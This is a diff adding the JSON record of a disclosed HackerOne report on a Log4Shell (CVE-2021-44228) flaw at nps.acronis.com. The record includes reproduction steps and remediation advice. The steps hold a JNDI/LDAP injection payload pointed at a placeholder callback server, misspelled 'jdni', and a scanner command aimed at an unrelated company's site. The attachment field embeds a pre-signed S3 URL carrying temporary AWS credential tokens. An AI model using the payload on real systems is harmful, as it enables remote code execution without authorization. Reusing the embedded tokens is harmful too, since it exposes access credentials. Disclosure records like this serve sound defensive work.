@@ -1,0 +1,144 @@
+{
+  "id": 1425474,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDI1NDc0",
+  "url": "https://hackerone.com/reports/1425474",
+  "title": "[CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-12-13T23:42:16.347Z",
+  "submitted_at": "2021-12-13T23:42:16.454Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rhinestonecowboy",
+    "url": "/rhinestonecowboy",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTQ5MDcsInB1ciI6ImJsb2JfaWQifX0=--f3182ba06445d475121eff5f6e41d5010223aa6a/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/hackerGirl.jpg"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-44228"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-07-13T00:26:11.739Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-13T00:26:11.689Z",
+  "team_member_agreed_on_going_public_at": "2022-07-12T17:20:57.424Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThe website at nps.acronis.com is vulnerable to CVE-2021-44228\n\n## Steps To Reproduce\nI used this [script](https://github.com/fullhunt/log4j-scan) to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them.\n\n  1. Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server>/test}`\n  1. Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: `python3 log4j-scan.py -u 'https://marketingportal.engelvoelkers.com'`\n  1. Observe the callback, proving the deserialization of untrusted data which leads to rce\n\n{F1544482}\n \n## Recommendations\nUpdate log4j to the latest [version](https://logging.apache.org/log4j/2.x/download.html)\nIf updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true.\n\n## Impact\n\nRemote Code Execution (rce)",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1544482,
+      "file_name": "2021-12-14-013717_1366x768_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j3gt4ho398sl4wfb7lu8810vfxqm?response-content-disposition=attachment%3B%20filename%3D%222021-12-14-013717_1366x768_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272021-12-14-013717_1366x768_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSTQAVQP4%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T231341Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQCTUONg8rOgt0jJ%2F3TrAqfnw601jJWVPfXifsk%2FW%2BLK7QIhAMGGDYfFDmVKxAob%2BionYCWkghzARXsi80rujTijS1y1KrsFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx94JKvjDXdvmt2Z5YqjwUIZSeIw%2FwdcJm5YM7%2Fzj2Nb7%2BL07VSGrwZcrAFdg553eL0%2BZAQc76fk8Ex7l6Uf%2F3ikVcxL9ziiMsVIXtsj7Ng8u8JV%2ByqYngvufFEBqwmF0v1BH9rqMO7LF6urIIWOASyXaCQ3X%2BY1tUJxe37UXfc17QXjdbJGxNuVHVgClJYS7PV2V%2B%2FsJFxLRAeN%2BR%2FJSwGltigg5dYzBvuce3MqykGzHR%2FsIRYBwuyQ5faPmbZQT96kayjFLZs%2B7NNWtW9VgHP%2B%2FX5nGFQg%2BEyAPH4ocZ%2BHEQesKz1xFaKagmxSdiKW2TWlS7j3BmjeA4GLFHGXPYvGuSHZXkIlnlynUpViNaMRooYDcZ469KjIMZ52msg5uTSTqZH8RN71i75ZXUowtuEG6lCR225YRPUH7aNh%2B6SYx%2B%2Fiq9rI%2BWz2tWEni9GPcBiEYCHY4vvOwSVSEeYnlKMBV9ePkwk4EuvYdcDMllyXcvrVxpLuB%2BqKQ3pPl4CZ5Q361PbRVYMPJUY%2Bgtwj7wGQlO6lyO5Lt6ALg2g0LYqYKYvbB6qZ0KCguD4y%2Bk%2FLBW0oYXNn4jN5D6C7o8AshcXjt7U1s6RnEx%2F0g373zMFJ37i%2BmWwhX4bGvnjWdwLQw03OtJhLCC4NqXrJhFxybk5wTHwa%2FzSSrB%2FHW8uAIvBzBI4UAYwtMklIHgi3gTQKQ%2FdhUNRAZlbxyZHNTeR4XWsNTXmsBAuW%2FyUHWgxsWzvy5BY%2B%2FrTdU1qqyaIheuZkpahjVk4NFY6nuc3pITKxMyqi98hhRiVAhgRebro9ayUQc1ph9hfQlK%2FYtHa3IDyEacxkXteXUJY6SNCmAkTWRQy18FEIU%2Fwcj0iPZEL8TXqsOZcfO8h7JQheRzqIHIKMPWJvMYGOrAB%2FG5iWehhltchMJFe0uyAuUiK5LT9GEHYkAXnr89MJSI5Cbs4afjg0tB9hGrwm5w61IusnmMYEWeN6kzojlt7qZ6MLbqHlPnVfWq78NdihXFuDtuVoSz8jxC%2FA79MlEjp%2Bcne1ic8SOAztDSoLuVM6FQuc8AKWiQbievmOjsXXNF3Goxsgkv4tPjXu52e2zlnyfoMEzgXb40sGah%2FuFrbe%2FCgc%2F3oFfp11VPwBr33XYo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3341009677fdf53dda0f4fcf6f4089316d1ea9a88e0c18de828aa72da2119ec6",
+      "file_size": 222870,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 74,
+  "voters": [
+    "he4am",
+    "tsyogesh40",
+    "drsniper",
+    "zy9ard3",
+    "mr-k0anti",
+    "shreyaschavhan",
+    "yassinek3ch",
+    "amsda",
+    "rahul-kadavil",
+    "hsalo",
+    "and 64 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 50773,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.acronis.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
